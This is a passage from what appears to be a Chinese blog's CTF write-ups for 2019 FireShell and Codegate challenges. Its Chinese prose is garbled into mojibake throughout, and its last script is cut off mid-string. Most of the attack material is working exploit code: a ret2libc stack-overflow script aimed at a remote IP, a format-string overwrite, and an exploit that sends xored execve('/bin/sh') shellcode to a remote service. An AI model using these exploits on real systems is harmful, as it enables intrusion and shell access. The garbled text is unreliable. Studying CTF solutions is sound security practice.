0x00003D7D, 0x00000000, 0x0000005F, 0x00000006, 0x00000000, 0x00003D7D, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x00022965, 0x00000000, 0x000228E8, 0x00000006, 0x00000002, 0x00000000, 0x00022965, 0x00000000, 0x00022965, 0x00000006, 0x00000003, 0x00000000]i = -1j = 0buf = [0 for k in range(530)]tmp = 0count = 1flag = ''while(True): if i - 1 != tmp and buf[i - 1] == 0: flag += chr(buf[i]) tmp = i - 1 c = code[j] if c == 0: i += 1 j += 1 buf[i] = code[j] elif c == 1: i -= 1 buf[i] += buf[i + 1] elif c == 3: print 'Over' break elif c == 4: i -= 1 buf[i] *= buf[i + 1] elif c == 5: i -= 1 buf[i] /= buf[i + 1] elif c == 6: i -= 1 buf[i] -= buf[i + 1] elif c == 2: j += 1 continue else: print 'Error' break print 'buf[&#123;&#125;] = &#123;&#125;'.format(str(i), hex(buf[i])) j += 1print flag åŒæ—¶åœ¨bufçš„å€¼ä¸­å‘ç°buf[0] = 0x46 = &#39;F&#39; ; buf[11] = 0, buf[12] = 0x23 = &#39;#&#39; ; ...ï¼ŒçŒœæµ‹æ¯æ¬¡è¾“å‡ºä¸ºbuf[i] = 0çš„åä¸€ä¸ªå€¼å³buf[i + 1]ä¸ºflagçš„å€¼ã€‚å¯¹è„šæœ¬ç¨ä½œä¿®æ”¹åå¾—åˆ°flagã€‚ PWNleaklessç®€å•æ ˆæº¢å‡ºã€‚ 1234567[leakless] checksec leakless[*] '/root/ctf/2019-FireShell/leakless/leakless' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) æ²¡å¼€canaryå’Œpieã€‚å¯ä»¥çœ‹åˆ°æº¢å‡ºæ¼æ´åœ¨è¿™é‡Œï¼š 123456ssize_t feedme()&#123; char buf; // [esp+0h] [ebp-48h] return read(0, &amp;buf, 0x100u);&#125; ç¬¬ä¸€æ¬¡å…ˆæ³„éœ²å‡ºputsçš„åœ°å€ï¼Œç„¶åæ‰¾åˆ°libcçš„ç‰ˆæœ¬ï¼Œreturnå›feedme()å‡½æ•°ã€‚ç¬¬äºŒæ¬¡ç›´æ¥è·³systemã€‚expå¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import *context.log_level = 'debug'context.arch = 'i386'p = remote('35.243.188.20', 2002)elf = ELF('./leakless')offset = 76feedme = elf.symbols['feedme']puts_plt = elf.plt['puts']puts_got = elf.got['puts']log.success('feedme = ' + hex(feedme))log.success('puts_plt = ' + hex(puts_plt))log.success('puts_got = ' + hex(puts_got))payload1 = flat([ 'A' * offset, puts_plt, feedme, puts_got])p.sendline(payload1)puts = u32(p.recv(4))log.success('puts = ' + hex(puts))libc = LibcSearcher('puts', puts)libc_base = puts - libc.dump('puts')system = libc_base + libc.dump('system')str_bin_sh = libc_base + libc.dump('str_bin_sh')log.success('libc_base = ' + hex(libc_base))log.success('system = ' + hex(system))log.success('str_bin_sh = ' + hex(str_bin_sh))payload2 = flat([ 'A' * offset, system, 0x12345678, str_bin_sh])p.interactive() casinoé™¤äº†pieå…¶ä»–ä¿æŠ¤éƒ½å¼€äº†ï¼š 1234567[casino] checksec casino 11:02:20 [*] '/root/ctf/2019-FireShell/casino/casino' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) åœ¨idaé‡ŒæŸ¥çœ‹mainå‡½æ•°ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// local variable allocation has failed, the output may be wrong!int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+4h] [rbp-5Ch] int v5; // [rsp+8h] [rbp-58h] unsigned int i; // [rsp+Ch] [rbp-54h] unsigned int seed; // [rsp+10h] [rbp-50h] int v8; // [rsp+14h] [rbp-4Ch] FILE *stream; // [rsp+18h] [rbp-48h] char buf; // [rsp+20h] [rbp-40h] char ptr; // [rsp+30h] [rbp-30h] unsigned __int64 v12; // [rsp+58h] [rbp-8h] v12 = __readfsqword(0x28u); setup(*(_QWORD *)&amp;argc, argv, envp); seed = (unsigned int)time(0LL) / 0xA; printf(\"What is your name? \"); read(0, &amp;buf, 0x10uLL); printf(\"Welcome \", &amp;buf); printf(&amp;buf); putchar(10); seed += bet; srand(seed); v4 = 0; v5 = 0; for ( i = 1; (signed int)i &lt;= 99; ++i ) &#123; v8 = rand(); printf(\"[%d/100] Guess my number: \", i); __isoc99_scanf(\"%d\", &amp;v4); if ( v8 != v4 ) &#123; puts(\"Sorry! It was not my number\"); exit(0); &#125; puts(\"Correct!\"); v5 += bet; &#125; if ( v5 &gt; 100 ) &#123; puts(\"Cool! Here's another prize\"); stream = fopen(\"flag.txt\", \"r\"); fread(&amp;ptr, 0x1EuLL, 1uLL, stream); fclose(stream); printf(\"%s\", &amp;ptr); &#125; return 0;&#125; éœ€è¦çŒœ99æ¬¡éšæœºæ•°ï¼Œç„¶åä½¿å¾—ç”±betç´¯åŠ èµ·æ¥å¤§äº100å³å¾—åˆ°flagã€‚é¦–å…ˆè¦è¿‡å‰é¢çš„çŒœæ•°å­—ï¼Œç…§æ ·å­å†™ä¸€ä¸ªcç¨‹åºå³å¯ï¼š 12345678910111213141516#include &lt;stdio.h&gt;#include &lt;time.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int main() &#123; int seed = time(0) / 0xA; int bet = 2; // 1; seed += bet; srand(seed); for (int i = 0; i &lt; 99; i++) &#123; int a = rand(); printf(\"%d\\n\", a); &#125; return 0;&#125; å…ˆç¼–è¯‘ï¼Œgcc solve.c -o solveï¼›å†pipeä¸€ä¸‹ï¼Œ(echo &#39;test&#39;; ./solve) | ./casinoã€‚å¾—åˆ°ç»“æœæ˜¯ï¼š 123[1/100] Guess my number: Correct!...[99/100] Guess my number: Correct! è¯´æ˜çŒœæ•°å­—è¿‡äº†ï¼Œè€Œbetç´¯åŠ èµ·æ¥åªæœ‰99ï¼Œæ²¡æœ‰è¶…è¿‡100ã€‚æ­¤æ—¶å›å¿†ä¹‹å‰çš„ä»£ç ï¼Œprintf(&quot;Welcome &quot;, &amp;buf);å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬åªéœ€è¦é€šè¿‡è¿™ä¸ªæ¼æ´ï¼Œå°†betçš„å€¼æ”¹å†™å³å¯ã€‚é€šè¿‡gdbè°ƒè¯•å¾—åˆ°betçš„åœ°å€ï¼š 123456789[-------------------------------------code-------------------------------------] 0x400ac3 &lt;main+132&gt;: call 0x400840 &lt;printf@plt&gt; 0x400ac8 &lt;main+137&gt;: mov edi,0xa 0x400acd &lt;main+142&gt;: call 0x4007f0 &lt;putchar@plt&gt;=&gt; 0x400ad2 &lt;main+147&gt;: mov eax,DWORD PTR [rip+0x201548] # 0x602020 &lt;bet&gt; 0x400ad8 &lt;main+153&gt;: add DWORD PTR [rbp-0x50],eax 0x400adb &lt;main+156&gt;: mov eax,DWORD PTR [rbp-0x50] 0x400ade &lt;main+159&gt;: mov edi,eax 0x400ae0 &lt;main+161&gt;: call 0x400870 &lt;srand@plt&gt; ç¡®å®šç¬¬ä¸€ä¸ªå‚æ•°åœ¨æ ˆä¸Šçš„åç§»ä¸º11ï¼š 1234567891011[casino] python -c 'print \"%2c%11$n\" + \"\\x20\\x20\\x60\\x00\\x00\\x00\\x00\\x00\"' &gt; input 20:06:05 [casino] gdb ./casino -q 20:06:11 Reading symbols from ./casino...(no debugging symbols found)...done.assassinq&gt;&gt; b *main+137Breakpoint 1 at 0x400ac8assassinq&gt;&gt; r &lt; input Starting program: /root/ctf/2019-FireShell/casino/casino &lt; inputWhat is your name? Welcome ? `Breakpoint 1, 0x0000000000400ac8 in main ()assassinq&gt;&gt; x/wx 0x6020200x602020 &lt;bet&gt;: 0x00000002 æˆ‘æŠŠbetçš„å€¼æ”¹ä¸º2ã€‚æœ€åçš„expå¦‚ä¸‹ï¼š 12345678910111213141516171819202122#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'context.arch = 'amd64'local = 1if local: p = process('./casino')else: passbet_addr = 0x0000000000602020bet = 2offset = 11fmt = '%&#123;&#125;c%&#123;&#125;$n'payload = flat([fmt.format(str(bet), str(offset)), bet_addr])p.sendlineafter('name?', payload)s = process('./solve')nums = s.recvall().split('\\n')[:-1]s.close()for n in nums: p.sendlineafter('number:', n)print p.recvall()p.close() babyheapå‚è€ƒç½‘ç«™https://cute-0tter.hatenablog.com/entry/2019/01/28/153836https://mp.weixin.qq.com/s/T5APY4HJnw7rM3nvxDi8NAhttps://mp.weixin.qq.com/s/LzyKtwmqq5HO6meUqq7aughttps://github.com/D4nch3n/Cyber-Competitions/blob/master/fireshellctf/README.mdhttps://github.com/flawwan/CTF-Writeups/blob/master/Fireshell/casino/casino.md","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"review","slug":"review","permalink":"https://qianfei11.github.io/tags/review/"}]},{"title":"2019-Codegate-review","slug":"2019-Codegate-review","date":"2019-01-28T01:41:35.000Z","updated":"2019-02-02T12:27:50.907Z","comments":true,"path":"2019/01/28/2019-Codegate-review/","link":"","permalink":"https://qianfei11.github.io/2019/01/28/2019-Codegate-review/","excerpt":"æ‰“äº†ä¸€æ¬¡CodegateçœŸæ»´å¤ªéš¾äº†ã€‚è·Ÿç€å›½å¤–å¤§ä½¬çš„writeupå¤ç°è¿˜æ˜¯å­¦åˆ°äº†ä¸€ç‚¹ä¸œè¥¿ã€‚","text":"æ‰“äº†ä¸€æ¬¡CodegateçœŸæ»´å¤ªéš¾äº†ã€‚è·Ÿç€å›½å¤–å¤§ä½¬çš„writeupå¤ç°è¿˜æ˜¯å­¦åˆ°äº†ä¸€ç‚¹ä¸œè¥¿ã€‚ MIC check19P&amp;;gFD,5.BOPCdBl7Q+@Vâ€™1dDK?qL æ‰¾ä¸ªåœ¨çº¿è§£base85çš„ç½‘ç«™å³å¯ã€‚ KingMakerè¿è¡Œelfå‘ç°æ˜¯ä¸€ä¸ªåœ¨ç»ˆç«¯ä¸Šçš„æ–‡å­—å†’é™©æ¸¸æˆï¼Œæ¯æ¬¡åšå‡ºé€‰æ‹©ç„¶åè¾“å…¥keyï¼Œè‹¥æ­£ç¡®åˆ™è¿›å…¥ä¸‹ä¸€ç¯èŠ‚ã€‚mainå‡½æ•°ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; int choice; // [rsp+4h] [rbp-Ch] unsigned __int64 v5; // [rsp+8h] [rbp-8h] v5 = __readfsqword(0x28u); mprotect(&amp;dword_400000, 0x4096uLL, 7); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); put_s(\" _ ___ __ __ _ \", 0LL); put_s(\" | |/ (_)_ __ __ _| \\\\/ | __ _| | _____ _ __ \", 0LL); put_s(\" | ' /| | '_ \\\\ / _` | |\\\\/| |/ _` | |/ / _ \\\\ '__|\", 0LL); put_s(\" | . \\\\| | | | | (_| | | | | (_| | &lt; __/ | \", 0LL); put_s(\" |_|\\\\_\\\\_|_| |_|\\\\__, |_| |_|\\\\__,_|_|\\\\_\\\\___|_| \", 0LL); put_s(\" |___/ \\n\", 0LL); put_s(\"Once upon a time, there was a kingdom with 7 princes.\", 0LL); put_s(\"One day the king thinks to decide the who will be the next king.\", 0LL); put_s(\"So he made 5 tests for the princes.\", 0LL); put_s(\"If you pass all the tests, you can be a king!\\n\", 0LL); put_s(\"**********************KING MAKER START**********************\\n\", 0LL); put_s(\"...\", 0LL); put_s(\".....\", 0LL); put_s(\".......\", 0LL); put_s(\"Who am I...??\", 0LL); put_s(\"1&gt; Ask to someone\", 0LL); put_s(\"2&gt; Look around\", 0LL); __isoc99_scanf(\"%d\", &amp;choice); printf(\"\\x1B[H\\x1B[J\", &amp;choice); if ( choice == 1 ) &#123; sub_403636((__int64)\"\\x1B[H\\x1B[J\", (__int64)&amp;choice); &#125; else &#123; if ( choice != 2 ) end_game(\"SYSTEM : Choose wrong choice!\", 0LL); sub_403607((__int64)\"\\x1B[H\\x1B[J\", (__int64)&amp;choice); &#125; return 0LL;&#125; åœ¨end_game()ä¸­çœ‹åˆ°cat flagã€‚åŒæ—¶å‘ç°åªè¦äº”ä¸ªå˜é‡åŒæ—¶ç­‰äº5å°±èƒ½å¾—åˆ°flagï¼š 1234567891011121314151617void __fastcall __noreturn end_game(const char *a1, __int64 a2)&#123; puts(a1); if ( (_DWORD)a2 == 1 ) &#123; if ( brave != 5 || wise != 5 || kind != 5 || decision != 5 || sacrifice != 5 ) &#123; put_s(\"King : But you couldn't make the points... You can't be a king.\", a2); &#125; else &#123; put_s(\"King : Congratuations to be a king!\", a2); system(\"/bin/cat ./flag\"); &#125; &#125; exit(-1);&#125; ç¨‹åºå¾€ä¸‹èµ°ï¼Œçœ‹åˆ°stage1()è¦æ±‚è¾“å…¥keyã€‚ä¹‹åçœ‹æ€»å…±æœ‰äº”æ¬¡è¦æ±‚è¾“å…¥keyï¼Œä¸‹é¢åˆ—å‡ºç¬¬ä¸€æ¬¡çš„åæ±‡ç¼–ä»£ç ï¼š 12345678910111213141516171819202122232425unsigned __int64 __fastcall stage1(__int64 a1, __int64 a2)&#123; __int64 v2; // rsi char key1; // [rsp+0h] [rbp-10h] unsigned __int64 v5; // [rsp+8h] [rbp-8h] v5 = __readfsqword(0x28u); put_s(\"You : Am I....??\", a2); put_s(\"Servant : The king calls the prince!\", a2); put_s(\"...\", a2); put_s(\".....\", a2); put_s(\".......\\n\", a2); put_s(\"King : I'm too old to rule the kingdom.\", a2); put_s(\"King : So I will give you few tests and choose the next king.\", a2); put_s(\"King : The only one prince who passes all the tests can be the king.\\n\", a2); put_s(\"King : If you want to participate at this test, Enter the key for test 1\", a2); __isoc99_scanf(\"%s\", &amp;key1); printf(\"\\x1B[H\\x1B[J\", &amp;key1); if ( !(unsigned int)check(&amp;key1, 1u, 5u) ) end_game(\"King : Wrong! Don't you want to be a king?\", 0LL); v2 = (unsigned int)num1[0]; encrypt_func(&amp;loc_40341D, num1[0], &amp;key1); ((void (__fastcall *)(char *, __int64))loc_40341D)(&amp;key1, v2); return __readfsqword(0x28u) ^ v5;&#125; ä¸‹é¢å‘ç°å¦‚æœè¿‡äº†checkï¼Œå‡½æ•°loc_40341Dè¿™é‡Œè¢«åŠ å¯†äº†ï¼Œåªæœ‰ä¸€å¤§å—å¥‡æ€ªçš„æ•°æ®å—ï¼š 12345678910111213141516171819202122.text:000000000040341D ; ---------------------------------------------------------------------------.text:000000000040341D.text:000000000040341D loc_40341D: ; CODE XREF: stage1+CDâ†“p.text:000000000040341D ; DATA XREF: stage1+BCâ†“o.text:000000000040341D ; __unwind &#123;.text:000000000040341D cmp [rdi], eax ; Compare Two Operands.text:000000000040341F call rsi ; Indirect Call Near Procedure.text:0000000000403421 and al, 0CCh ; Logical AND.text:0000000000403421 ; ---------------------------------------------------------------------------.text:0000000000403423 db 9Ah, 13h, 24h, 0C6h, 0Bh.text:0000000000403428 dq 76674937FD0708DBh, 0B67E9476FF076C33h, 0A0B484333616848Ch.text:0000000000403428 dq 9E4F2C697EF093CCh, 3615048C89B0BAC2h, 0CCF093CCA0A88433h.text:0000000000403428 dq 89B0BAEE9E4F2C65h, 0A09C84333619AF8Ch, 0FF079876FB0793CCh.text:0000000000403428 dq 76F76C734F00D3F5h, 89B0B8639E4F6C33h, 764FD43336763E8Ch.text:0000000000403428 dq 0FDB093E097A76C33h, 0FD6B19328ECC9876h, 23C4243356737F36h.text:0000000000403428 dq 760F5F3CC989E5DBh, 33C424CC899960DBh, 89B13ADBB1C624DBh.text:0000000000403428 dq 8ECC9876FD7487CCh, 56748F36FD6B1931h, 0C989E5DB23C42433h.text:0000000000403428 dq 899A8CDB760F5FCCh, 0B1C624DB33C424CCh, 0C84087CC89B076DBh.text:0000000000403428 dq 3676CF8C764F6C33h, 3EDF93CCA02D8433h, 534B5F7B12B729B8h.text:0000000000403428 dq 33A76947764F6C1Bh.text:0000000000403508 db 0E0h, 93h, 0B0h, 0BFh, 0F0h.text:0000000000403508 ; &#125; // starts at 40341D è¿›å…¥encrypt()å‡½æ•°ï¼ŒåŸºæœ¬ä¸Šå°±èƒ½çŸ¥é“å¯¹å‡½æ•°é€šè¿‡keyå¼‚æˆ–æ¥åŠ å¯†ï¼š 123456789101112131415161718192021_BYTE *__fastcall encrypt(_BYTE *start_addr, int end_addr, const char *key)&#123; _BYTE *fp; // rax char *s; // [rsp+8h] [rbp-28h] signed int i; // [rsp+20h] [rbp-10h] unsigned int len; // [rsp+24h] [rbp-Ch] _BYTE *addr; // [rsp+28h] [rbp-8h] s = (char *)key; i = 0; len = strlen(key); for ( addr = start_addr; ; ++addr ) &#123; fp = &amp;start_addr[end_addr]; if ( fp &lt;= addr ) break; *addr ^= s[i]; i = (i + 1) % len; &#125; return fp;&#125; åˆå› ä¸ºæ¯ä¸ªå‡½æ•°è°ƒç”¨æ—¶ï¼Œä¸€å¼€å§‹éƒ½ä¼šæœ‰push rbp ; mov rbp, rsp ;ï¼Œåå…­è¿›åˆ¶è¡¨ç¤ºä¹Ÿå°±æ˜¯0x554889e5ï¼š 12345678910from pwn import *code = ''' push rbp mov rbp, rsp'''print hex(u32(asm(code)))# 0xe5894855# little endian# 55 push rbp# 4889e5 mov rbp, rsp ç„¶åç”±æ­¤å¯ä»¥è§£å‡ºkey1å’Œkey2ï¼Œç„¶åkey3ã€key4å’Œkey5æ ¹æ®ä¹‹å‰è§£å‡ºå‡½æ•°å¯ä»¥å¾—åˆ°ã€‚ä¸‹é¢ç»™å‡ºè„šæœ¬ï¼š 12345678910111213141516171819202122232425262728def test(func, length): prologue = [0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x89, 0x7D, 0xE8] length = min(len(prologue), length) key = '' for i in range(length): key += chr(func[i] ^ prologue[i]) return keyfunc1 = [0x39, 0x07, 0xff, 0xd6, 0x24, 0xcc, 0x9a]key1 = test(func1, len(func1))print key1# lOv3func2 = [0x11, 0x78, 0xe5, 0xd4, 0x0c, 0xb3, 0x80]key2 = test(func2, len(func2))print key2# D0l1func3 = [0x1D, 0x3D, 0xC7, 0x82, 0x1A, 0xDA, 0xB8, 0x11, 0x25, 0xBA, 0x35]key3 = test(func3, len(func3))print key3# HuNgRYT1m3func4 = [0x13, 0x78, 0xFC, 0xB7, 0x1B, 0xB0, 0x8D, 0x73, 0x78, 0xE7, 0x3B, 0xD8, 0x11]key4 = test(func4, len(func4))print key4# F0uRS3aS0nfunc5 = [0x01, 0x79, 0xE2, 0xB1, 0x7C, 0xE8, 0xB8, 0x10, 0x03, 0xE2, 0x29, 0xD9]key5 = test(func5, len(func5))print key5# T1kT4kT0Kk æ¥ä¸‹æ¥å°±ç›´æ¥å°†è¢«åŠ å¯†çš„å‡½æ•°patchä¸€ä¸‹ï¼Œè¿›ä¸€æ­¥çœ‹çœ‹ã€‚éœ€è¦patchçš„å…¶å®å¾ˆå¤šï¼Œå·¥ç¨‹æµ©å¤§ï¼Œè´´ä¸Šè½¬è‡ªå¤§ä½¬çš„patchè„šæœ¬ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364key1 = 'lOv3'key2 = 'D0l1'key3 = 'HuNgRYT1m3'key4 = 'F0uRS3aS0n'key5 = 'T1kT4kT0Kk'def xor(arr, key): for i in range(len(arr)): arr[i] = arr[i] ^ ord(key[i % len(key)]) return arrpatches = [ (0x341D, 0xf0, key1), (0x33FF, 0x1e, key1), (0x330F, 0xf0, key1), (0x32DE, 0x31, key1), (0x32C0, 0x1e, key1), (0x3197, 0x129, key1), (0x30D4, 0x0C3, key1), (0x2D55, 0x0FA, key2), (0x2C25, 0x112, key2), (0x2D37, 0x1e, key2), (0x27E9, 0x44, key2), (0x29B9, 0x0E6, key2), (0x2B2B,0x0FA, key2), (0x271C, 0x0CD, key2), (0x28B5, 0xe6, key2), (0x299B, 0x1e, key2), (0x2A9F, 0x4E, key2), (0x2AED, 0x3e, key2), (0x282D, 0x44, key2), (0x2871, 0x44, key2), (0x20E2, 0x18d, key3), (0x201F, 0xc3, key3), (0x1B0A, 0xf0, key4), (0x19F2, 0x0FA, key4), (0x1AEC, 0x1e, key4), (0x192C, 0xa8, key4), (0x19D4, 0x1e, key4), (0x16D0, 0xc3, key4), (0x11BB, 0x131, key5), (0x0F25, 0x0DC, key5), (0x108B, 0x130, key5), (0x0DE7, 0x120, key5), (0x0F07, 0x1e, key5), (0x1001, 0x1e, key5), (0x101F, 0x4e, key5), (0x106D, 0x1e, key5), (0x0C8C, 0x158, key5)]with open('patched', 'wb') as patched: with open('./KingMaker', 'rb') as binary: data = bytearray(binary.read()) for offset, size, key in patches: data[offset:offset+size] = xor(data[offset:offset+size], key) patched.write(data) patched.close() æŠŠpatchåçš„elfæ‹–è¿›idaåï¼Œå°±èƒ½æŠŠæ‰€æœ‰çš„è¿‡ç¨‹ç†æ¸…æ¥šäº†ï¼Œæœ€éº»çƒ¦çš„æ–¹æ³•å°±æ˜¯æŠŠæ‰€æœ‰çš„å¯èƒ½éƒ½è®°å½•ä¸‹æ¥ï¼Œé€’å½’ä¸€ä¸‹ã€‚æ”¾ä¸Šå¤§ä½¬çš„è„šæœ¬ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#!/usr/bin/env python def addArr(a,b): c = [] for i in range(5): c.append(a[i]+b[i]) return c def addLevel1(a): x = [(\"1,lOv3,1,2,1,1\", [2,0,1,1,2]), (\"1,lOv3,1,2,1,2\", [2,-1,0,1,-1]), (\"1,lOv3,1,2,1,3\", [2,2,0,1,0]), (\"1,lOv3,1,2,2,1\", [2,0,2,0,2]), (\"1,lOv3,1,2,2,2\", [2,-1,1,0,-1]), (\"1,lOv3,1,2,2,3\", [2,2,1,0,0]), (\"1,lOv3,1,2,3,1\", [2,0,3,1,2]), (\"1,lOv3,1,2,3,2\", [2,-1,2,1,-1]), (\"1,lOv3,1,2,3,3\", [2,2,2,1,0])] for i in range(len(x)): n = addArr(a,x[i][1]) addLevel2(n,x[i][0]) def addLevel2(a,s): x = [(\"D0l1,1,1,1,1,1\", [0,1,-1,3,0]), (\"D0l1,1,1,1,1,2\", [0,1,0,3,0]), (\"D0l1,1,1,1,2,1\", [0,1,-1,3,0]), (\"D0l1,1,1,1,2,2\", [0,1,0,3,0]), (\"D0l1,1,1,2,1\", [0,1,-1,3,0]), (\"D0l1,1,1,2,2\", [0,1,0,3,0]), (\"D0l1,1,2,1,1,1,1,1\", [2,2,0,2,0]), (\"D0l1,1,2,1,1,1,1,2\", [2,2,1,2,0]), (\"D0l1,1,2,1,1,1,2,1\", [2,2,0,2,0]), (\"D0l1,1,2,1,1,1,2,2\", [2,2,1,2,0]), (\"D0l1,1,2,1,1,2,1\", [2,2,1,1,2]), (\"D0l1,1,2,1,1,2,2\", [2,3,2,1,2]), (\"D0l1,1,2,1,2,1,1,1\", [2,2,0,2,0]), (\"D0l1,1,2,1,2,1,1,2\", [2,2,1,2,0]), (\"D0l1,1,2,1,2,1,2,1\", [2,2,0,2,0]), (\"D0l1,1,2,1,2,1,2,2\", [2,2,1,2,0]), (\"D0l1,1,2,1,2,2,1\", [2,2,1,1,2]), (\"D0l1,1,2,1,2,2,2\", [2,3,2,1,2]), (\"D0l1,1,3,1,1,1,1\", [2,3,0,2,0]), (\"D0l1,1,3,1,1,1,2\", [2,3,1,2,0]), (\"D0l1,1,3,1,1,2,1\", [2,3,0,2,0]), (\"D0l1,1,3,1,1,2,2\", [2,3,1,2,0]), (\"D0l1,1,3,1,2,1\", [2,3,1,1,2]), (\"D0l1,1,3,1,2,2\", [2,4,2,1,2])] for i in range(len(x)): n = addArr(a,x[i][1]) addLevel3(n,s+','+x[i][0]) def addLevel3(a, s): x = [(\"HuNgRYT1m3,1,1,2\", [1,-1,0,3,2]), (\"HuNgRYT1m3,1,2,1\", [0,0,1,1,0]), (\"HuNgRYT1m3,1,2,3\", [1,0,1,1,1]), (\"HuNgRYT1m3,2,1,2\", [1,-2,1,2,2]), (\"HuNgRYT1m3,2,2,1\", [0,-1,2,0,0]), (\"HuNgRYT1m3,2,2,3\", [1,-1,2,0,1]), (\"HuNgRYT1m3,3,1,2\", [1,-2,1,3,2]), (\"HuNgRYT1m3,3,2,1\", [0,-1,1,1,0]), (\"HuNgRYT1m3,3,2,3\", [1,-1,1,1,1])] for i in range(len(x)): n = addArr(a,x[i][1]) addLevel4(n, s+','+x[i][0]) def addLevel4(a,s): x = [(\"F0uRS3aS0n,1,1,AAAA,1,1,2\", [0,2,2,3,0]), (\"F0uRS3aS0n,1,1,AAAA,1,2\", [0,2,1,2,0]), (\"F0uRS3aS0n,1,1,AAAA,2\", [0,2,1,2,0])] for i in range(len(x)): n = addArr(a,x[i][1]) addLevel5(n,s+','+x[i][0]) def addLevel5(a,s): x = [(\"T1kT4kT0Kk,2,1,1,2,1\", [-1,0,0,1,1]), (\"T1kT4kT0Kk,2,1,2,2,1\", [0,0,1,2,1]), (\"T1kT4kT0Kk,3,2,2,1\", [0,0,0,2,2])] for i in range(len(x)): n = addArr(a,x[i][1]) for j in range(5): if (n[j] != 5): break if (j == 4): final = s+','+x[i][0] print(final.replace(',','\\n')) quit() addLevel1([0,0,0,0,0]) å°†è¾“å‡ºçš„è¿‡ç¨‹pipeåˆ°ncå°±è¡Œäº†ï¼š./solve.py | nc 110.10.147.104 13152ã€‚ å¤§ä½¬è¿˜ç»™å‡ºä¸€ç§pwnçš„åšæ³•ï¼Œä¹Ÿä¸æ˜¯å¾ˆå¤æ‚ã€‚æ˜¾ç„¶æ‰€æœ‰çš„scanf(&quot;%s&quot;, &amp;buf);éƒ½å­˜åœ¨bofï¼Œæ‰€æœ‰çš„keyéƒ½èƒ½æ˜¯å¯ä»¥è¢«è¦†ç›–ä¿®æ”¹çš„ï¼Œä¾‹å¦‚è¿™ä¸ªfuncï¼š 123456789101112131415void __fastcall __noreturn vul(__int64 key)&#123; char buf; // [rsp+10h] [rbp-30h] unsigned __int64 v2; // [rsp+38h] [rbp-8h] v2 = __readfsqword(0x28u); put_s(\"King : You have only 1 chance.\"); __isoc99_scanf(\"%s\", &amp;buf); if ( (unsigned int)check(&amp;buf) ) &#123; encrypt_func(sub_4016D0, dword_607114, (const char *)key); sub_4016D0(0, 1, 1, 2, 0); &#125; end_game(\"King : Wrong! You don't have ability to solve the worries of the people!\", 0);&#125; è¿™é‡Œå…ˆæ˜¯è¦è¿‡checkï¼š 123456789101112131415161718192021222324signed __int64 __fastcall check(const char *input)&#123; int v2; // [rsp+18h] [rbp-78h] signed int i; // [rsp+1Ch] [rbp-74h] char dest[16]; // [rsp+20h] [rbp-70h] char v5[26]; // [rsp+30h] [rbp-60h] char v6[26]; // [rsp+50h] [rbp-40h] char v7; // [rsp+72h] [rbp-1Eh] unsigned __int64 v8; // [rsp+78h] [rbp-18h] v8 = __readfsqword(0x28u); qmemcpy(v5, \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\", sizeof(v5)); strcpy(v6, \"ALICEAWTQJMJXTSPPZVCIDGQYRDINMCP\"); v7 = 0; v2 = 0; strncpy(dest, input, 5uLL); for ( i = 5; i &lt; strlen(input); ++i ) &#123; if ( v5[(input[i] - 65 + dest[v2] - 65) % 26] != v6[i] ) return 0LL; v2 = (v2 + 1) % 5; &#125; return 1LL;&#125; ç¬¦åˆæ¡ä»¶çš„å­—ä¸²ä¸ºAAAAAAWTQJMJXTSPPZVCIDGQYRDINMCPã€‚è¿‡äº†checkä¹‹åï¼Œè¦†ç›–æ‰keyï¼Œé€ä¸Šshellcodeå’Œkeyçš„å¼‚æˆ–ï¼Œå¹¶ä¸”ç¡®ä¿å¼‚æˆ–åçš„å­—ä¸²ä¸­ä¸å­˜åœ¨ä½¿scanfæ–­å¼€çš„å­—ç¬¦å³å¯ã€‚ä¹‹åç¨‹åºä¼šè°ƒç”¨encrypt_funcè§£å¯†shellcodeæœ€åget shellã€‚å¤§ä½¬çš„expå¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#!/usr/bin/env pythonfrom pwn import *r = remote('110.10.147.104', 13152)context.arch = 'amd64'payload = '''1 lOv3 1 211 D0l1 112 1 HuNgRYT1m311 2F0uRS3aS0n 1 1'''r.sendline(payload)shellcode = ''' /* execve(path='/bin///sh', argv=['sh'], envp=0) */ /* push '/bin///sh\\x00' */ push 0x68 xor eax, eax mov rax, 0x732f2f2f6e69622f push rax mov rdi, rsp /* push argument array ['sh\\x00'] */ /* push 'sh\\x00' */ push 0x1010101 ^ 0x6873 xor dword ptr [rsp], 0x1010101 xor esi, esi /* 0 */ push rsi /* null terminate */ push 8 pop rsi add rsi, rsp push rsi /* 'sh\\x00' */ mov rsi, rsp xor edx, edx /* 0 */ /* call execve() */ push SYS_execve /* 0x3b */ pop rax syscall'''xorkey = [ord(x) ^ ord(y) for x, y in zip('\\x13x\\xfc\\xb7\\x1b\\xb0\\x8ds\\xb9\\x13\\xba\\xb9\\x00\\xaa\\xdaf\\x95\\xda&#125;\\x9e\\x02\\xb90\\xbe\\xd8&amp;\\x1f\\t\\x10n\\xcdu\\x89S\\x83\\xbad 